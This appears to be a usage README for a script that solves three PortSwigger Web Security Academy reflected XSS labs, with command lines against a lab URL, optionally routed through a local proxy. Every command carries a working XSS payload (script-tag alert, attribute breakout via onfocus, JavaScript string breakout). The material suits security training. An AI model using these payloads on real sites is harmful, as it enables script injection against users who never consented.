# How to run script.py

### 1. Reflected XSS into HTML context with nothing encoded

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<script>alert('XSS')</script>"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<script>alert('XSS')</script>" -p 127.0.0.1:8080`

### 2. Reflected XSS into attribute with angle brackets HTML-encoded

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\" autofocus onfocus=alert('XSS') x=\""`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\" autofocus onfocus=alert('XSS') x=\"" -p 127.0.0.1:8080`

### 3. Reflected XSS into a JavaScript string with angle brackets HTML encoded

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\';-alert('XSS')-\'"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "';-alert('XSS')-'" -p 127.0.0.1:8080`
